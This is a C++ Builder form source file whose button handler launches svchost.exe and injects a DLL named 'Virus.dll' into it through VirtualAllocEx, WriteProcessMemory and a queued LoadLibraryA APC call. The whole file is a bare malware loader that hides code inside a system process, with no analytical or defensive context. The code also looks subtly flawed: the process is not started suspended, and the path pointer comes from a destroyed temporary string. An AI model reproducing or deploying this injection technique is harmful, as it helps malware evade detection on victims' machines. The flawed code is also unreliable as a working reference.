//---------------------------------------------------------------------------

#include <vcl.h>
#pragma hdrstop

#include "Unit1.h"
//---------------------------------------------------------------------------
#pragma package(smart_init)
#pragma resource "*.dfm"
TForm1 *Form1;
//---------------------------------------------------------------------------
__fastcall TForm1::TForm1(TComponent* Owner)
	: TForm(Owner)
{
}
//---------------------------------------------------------------------------


void __fastcall TForm1::Button1Click(TObject *Sender)
{
	STARTUPINFO StartInfo = {};
	PROCESS_INFORMATION ProcInfo = {};
	StartInfo.cb = sizeof(StartInfo);
	int result = CreateProcess(L"C:\\Windows\\system32\\svchost.exe",
								0,
								0,
								0,
								0,
								0,
								0,
								0,
								&StartInfo,
								&ProcInfo);
	if (!result)
	{
		ShowMessage("CreateProcess Fail");
		return;
	}
	AnsiString CurPath = ExtractFilePath(Application->ExeName);
	char* DllPath = AnsiString(CurPath + "Virus.dll").c_str() ;
	DWORD DllPathLen = strlen(DllPath) + 1;
	HMODULE KernelModAddr = GetModuleHandle(L"Kernel32.dll");
	FARPROC LoadLibraryAddr = GetProcAddress(KernelModAddr, "LoadLibraryA");
	if ((!KernelModAddr) || (!LoadLibraryAddr))
	{
		ShowMessage("Get ModualBase Fail");
		return;
	}
	PVOID param = VirtualAllocEx(ProcInfo.hProcess , NULL, DllPathLen ,MEM_COMMIT | MEM_TOP_DOWN,PAGE_READWRITE);
	if (!param)
	{
		ShowMessage("Memory Alloc Fail");
		return;
	}
	WriteProcessMemory(ProcInfo.hProcess, param,(LPVOID)DllPath, DllPathLen, 0);
	QueueUserAPC((PAPCFUNC)LoadLibraryAddr,ProcInfo.hThread ,(DWORD)param);
}

